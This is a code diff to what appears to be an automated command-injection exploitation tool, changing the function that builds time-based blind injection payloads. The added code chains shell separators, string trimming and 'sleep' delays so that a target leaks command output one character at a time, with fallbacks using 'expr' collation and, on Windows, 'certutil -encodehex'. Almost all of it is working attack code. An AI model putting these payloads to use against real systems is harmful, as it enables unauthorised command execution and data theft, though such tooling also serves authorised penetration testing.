@@ -574,6 +574,42 @@ def get_length_alter_interpreter(separator, cmd, candidate_length, timesec, http
 """
 Get the execution output, of shell execution.
 """
+"""
+The comparison a delay is scaled by, asked of the character where its ordinal cannot be read.
+
+'printf' is what an ordinal is read with, and a run that has traded it away for 'echo' is one whose
+target refuses it by name - so the question is put to 'expr', which answers which of two strings
+sorts first. The character compared against is written out, which only a printable one can be, and
+the pool the search runs over is held to those for as long as this is how the asking is done.
+"""
+"""
+The characters a question covers: every one the pool holds at or above this ordinal, or the one
+itself - the comparison reading "[ candidate -le byte ]".
+"""
+def _asked_about(position, ascii_char, operator):
+  pool = checks.generate_char_pool(position)
+  if operator == "-eq":
+    return [ascii_char] if ascii_char in pool else []
+  return [ordinal for ordinal in pool if ordinal <= ascii_char] if operator == "-ge" \
+         else [ordinal for ordinal in pool if ordinal >= ascii_char]
+
+"""
+The comparison a bracket carries, asked of the character where its ordinal cannot be read.
+
+These boundaries hold the output in a variable of their own, so the byte is there to be named - it
+is only where nothing holds it that the question has to be asked of a set instead.
+"""
+def _bracketed_as(ascii_char, ordinal_expr, operator):
+  collated = (checks.byte_collation("${" + settings.RANDOM_VAR_GENERATOR + "}", ascii_char, operator)
+              if checks.ordinal_unavailable() else None)
+  return (collated + settings.SINGLE_WHITESPACE + "=" + settings.SINGLE_WHITESPACE + "1") if collated \
+         else (str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal_expr)
+
+def _read_as(ascii_char, arith_operator, ordinal_term, operator):
+  collated = (checks.byte_collation("${" + settings.RANDOM_VAR_GENERATOR + "}", ascii_char, operator)
+              if checks.ordinal_unavailable() else None)
+  return (collated + "==1") if collated else (str(ascii_char) + arith_operator + ordinal_term)
+
 def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
   payload = ""
   win_operator = "GEQ" if operator == "-le" else "EQU"
@@ -581,7 +617,12 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
   arith_operator = "<=" if operator == "-le" else "=="
   if settings.TARGET_OS == settings.OS.WINDOWS:
     chain = checks.windows_separator(separator)
-    if chain is not None:
+    if chain == "&":
+      # Read through 'certutil -encodehex' instead of PowerShell - see windows_hex_byte_probe()
+      # for why, and why it is kept to this one separator.
+      payload = checks.windows_hex_byte_probe(chain, cmd, num_of_chars, win_operator,
+                                              format(ascii_char, "02x"), timesec)
+    elif chain is not None:
       # The ordinal has to be computed on the target: cmd.exe's IF compares strings by locale
       # collation ('M' GEQ 'a' holds), so only a numeric compare can be binary searched.
       payload = checks.windows_probe(chain,
@@ -608,12 +649,19 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 settings.RANDOM_VAR_GENERATOR + "=" + word + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
-                "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + var_ordinal_term + ")))"
+                # Named rather than converted where the run has traded 'printf' away: 'expr' answers
+                # which byte sorts first, and the arithmetic scales the delay by that answer.
+                "sleep $((" + str(timesec) + "*(" + _read_as(ascii_char, arith_operator, var_ordinal_term, operator) + ")))"
                 )
 
     elif separator in ("&", "&&") and checks.substitution_nests():
-      payload = separator + _timed_comparison(timesec, ascii_char,
-                  _ordinal_arg_expr(word, num_of_chars), arith_operator)
+      # The reading awk takes keeps a letter on the end of the byte, so the character compared
+      # against keeps one too - see checks.byte_collation().
+      collated = (checks.byte_collation(_ordinal_arg_byte(word, num_of_chars), ascii_char, operator, tail="X")
+                  if checks.ordinal_unavailable() else None)
+      payload = separator + (_timed_comparison(timesec, "", collated + "==1", "") if collated else
+                             _timed_comparison(timesec, ascii_char,
+                                               _ordinal_arg_expr(word, num_of_chars), arith_operator))
     elif separator == "&":
       # The "&&" this payload already carries holds the variable and the pin, where a pipe into "wc" would bring in an operator the separator under test is not.
       payload = (separator +
@@ -621,7 +669,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 settings.RANDOM_VAR_GENERATOR + "=" + word + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + "&&" +
-                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + var_ordinal_expr + " ]" + "&&" +
+                "[ " + _bracketed_as(ascii_char, var_ordinal_expr, operator) + " ]" + "&&" +
                 "sleep " + str(timesec)
                 )
 
@@ -635,16 +683,22 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                 # Perform the time-based comparisons
-                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + var_ordinal_expr + " ] " + separator +
+                "[ " + _bracketed_as(ascii_char, var_ordinal_expr, operator) + " ] " + separator +
                 "sleep " + str(timesec)
                 )
 
     elif separator in ("|", "||") and checks.substitution_nests():
       pipe = "|"
-      payload = (pipe +
-                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ]" + "||" +
-                "sleep " + str(timesec)
-                )
+      # A pipe keeps no variable, so where the ordinal cannot be read the byte is asked for as one
+      # of a set - and the bracket carries the question the other way round, the delay being what
+      # runs where it fails. See checks.byte_in_class().
+      matched, expected = (checks.byte_in_class(word, num_of_chars,
+                                                _asked_about(num_of_chars, ascii_char, operator))
+                           if checks.ordinal_unavailable() else (None, None))
+      asked = (matched + settings.SINGLE_WHITESPACE + "!=" + settings.SINGLE_WHITESPACE + expected) if matched \
+              else (str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator +
+                    settings.SINGLE_WHITESPACE + ordinal_expr)
+      payload = (pipe + "[ " + asked + " ]" + "||" + "sleep " + str(timesec))
     else:
       pass
 
